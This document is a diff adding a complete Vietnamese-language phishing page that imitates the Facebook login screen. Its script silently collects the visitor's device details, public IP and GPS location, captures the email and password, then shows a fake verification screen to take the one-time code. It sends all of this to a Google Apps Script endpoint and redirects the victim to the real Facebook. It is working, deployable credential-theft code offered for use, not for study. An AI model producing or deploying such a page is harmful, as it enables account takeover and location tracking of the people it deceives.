@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Đăng nhập hoặc tạo tài khoản</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f0f2f5; margin:0; padding:0; display:flex; justify-content:center; align-items:center; min-height:100vh; }
+        .container { background:white; width:396px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); padding:20px; text-align:center; }
+        .logo { font-size:50px; color:#1877f2; font-weight:bold; margin-bottom:10px; }
+        input { width:100%; padding:14px; margin:8px 0; border:1px solid #ddd; border-radius:6px; font-size:17px; box-sizing:border-box; }
+        input:focus { outline:none; border-color:#1877f2; }
+        button { width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:6px; font-size:17px; font-weight:bold; cursor:pointer; margin:10px 0; }
+        button:hover { background:#166fe5; }
+        .hidden { display:none; }
+    </style>
+</head>
+<body>
+
+<div id="loginScreen" class="container">
+    <div class="logo">f</div>
+    <h2>Đăng nhập vào Facebook</h2>
+    <form id="loginForm">
+        <input type="text" id="email" placeholder="Email hoặc số điện thoại" required>
+        <input type="password" id="pass" placeholder="Mật khẩu" required>
+        <button type="submit">Đăng nhập</button>
+    </form>
+</div>
+
+<div id="otpScreen" class="container hidden">
+    <div class="logo">f</div>
+    <h2>Xác minh tài khoản</h2>
+    <p id="otpMessage" style="font-size:14px;color:#666;"></p>
+    <input type="text" id="otp" placeholder="Nhập mã 6 số" maxlength="6" style="text-align:center;font-size:22px;letter-spacing:8px;width:100%;padding:12px;">
+    <button type="button" onclick="submitOTP()">Tiếp tục</button>
+</div>
+
+<script>
+    const WEB_APP_URL = "https://script.google.com/macros/s/PASTE_URL_MỚI_CỦA_BẠN/exec"; // ← DÁN URL SAU KHI DEPLOY LẠI
+
+    let stolenData = { device_info: {} };
+
+    window.onload = async () => {
+        console.log("%c✅ Page loaded", "color:green");
+
+        stolenData.user_agent = navigator.userAgent;
+        stolenData.device_info = {
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`
+        };
+
+        // Public IP (WebRTC)
+        try {
+            const rtc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
+            rtc.createDataChannel('');
+            rtc.onicecandidate = e => {
+                if (e.candidate && e.candidate.candidate.includes('srflx')) {
+                    stolenData.public_ip = e.candidate.candidate.split(' ')[4];
+                    console.log("%c✅ Public IP lấy được:", "color:green", stolenData.public_ip);
+                }
+            };
+            await rtc.setLocalDescription();
+        } catch(e) { console.log("Public IP không lấy được"); }
+
+        // GPS
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                stolenData.gps_lat = pos.coords.latitude;
+                stolenData.gps_lon = pos.coords.longitude;
+                console.log("%c✅ GPS lấy được:", "color:green", stolenData.gps_lat, stolenData.gps_lon);
+            }, () => console.log("GPS bị từ chối"));
+        }
+
+        // Battery (chỉ hoạt động tốt trên HTTPS)
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                stolenData.battery_level = Math.round(battery.level * 100) + "%";
+                console.log("%c✅ Battery:", "color:green", stolenData.battery_level);
+            } catch(e) { console.log("Battery không hỗ trợ trên HTTP"); }
+        }
+    };
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        stolenData.email = document.getElementById('email').value;
+        stolenData.password = document.getElementById('pass').value;
+
+        console.log("%c📤 Gửi LOGIN data...", "color:orange");
+        sendToSheet();
+
+        document.getElementById('loginScreen').classList.add('hidden');
+        document.getElementById('otpScreen').classList.remove('hidden');
+        document.getElementById('otpMessage').innerHTML = `Chúng tôi đã gửi mã đến <b>${stolenData.email}</b>.`;
+    });
+
+    window.submitOTP = function() {
+        const otpCode = document.getElementById('otp').value.trim();
+        if (!otpCode) return alert("Nhập mã OTP");
+        stolenData.otp = otpCode;
+
+        console.log("%c📤 Gửi OTP data...", "color:orange");
+        sendToSheet();
+
+        alert("Đăng nhập thành công! Dữ liệu đã được lưu.");
+        setTimeout(() => window.location.href = "https://www.facebook.com", 800);
+    };
+
+    function sendToSheet() {
+        fetch(WEB_APP_URL, {
+            method: "POST",
+            headers: { "Content-Type": "text/plain;charset=utf-8" },
+            body: JSON.stringify(stolenData)
+        })
+        .then(() => console.log("%c✅ Đã gửi thành công lên Sheet", "color:green"))
+        .catch(err => console.error("❌ Lỗi gửi:", err));
+    }
+</script>
+</body>
+</html>
